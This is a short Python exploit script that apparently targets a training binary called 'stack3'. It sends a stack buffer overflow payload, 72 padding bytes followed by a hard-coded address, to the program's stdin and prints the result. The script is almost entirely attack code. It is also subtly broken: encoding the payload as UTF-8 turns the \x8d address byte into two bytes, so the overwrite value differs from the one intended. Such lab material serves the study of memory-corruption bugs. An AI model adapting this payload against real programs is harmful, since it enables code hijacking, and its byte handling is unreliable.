from subprocess import Popen, PIPE, run

padding = "A" * 72
address = '\x8d\x11\x00\x00'

payload = padding + address + "\n"

p = Popen(['./stack3'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
out, err = p.communicate(input=payload.encode('utf-8'))

#out = run(['ls', '-la'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
#out = run(['./stack3'], input=padding.encode('utf-8'), stdout=PIPE, stderr=PIPE)

print(out, err)
#print("out: '{}'".format(out.decode()))
#print("err: '{}'".format(err.decode()))
#print(len(out))
print(p.returncode)
